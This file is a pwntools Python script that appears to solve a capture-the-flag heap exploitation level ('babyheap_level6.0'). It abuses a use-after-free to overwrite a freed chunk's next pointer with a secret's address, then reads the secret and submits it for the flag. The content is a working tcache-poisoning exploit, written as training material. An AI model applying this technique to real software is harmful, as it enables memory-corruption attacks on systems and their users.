#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level6.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

gdb.attach(p, s)



# parsing the address leak 



p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")

# uaf
# overwriting the next* pointer with address of secret -- 0x42a528
p.sendline(b"scanf")
p.sendline("1")
p.sendline(p64(0x42a528))


p.sendline("malloc 1 100")
p.sendline("malloc 0 100")


p.sendline("puts 0")

p.recvuntil(b"Data: ")
data = p.recvline().strip()


p.sendline(b"send_flag " + data)


p.interactive()



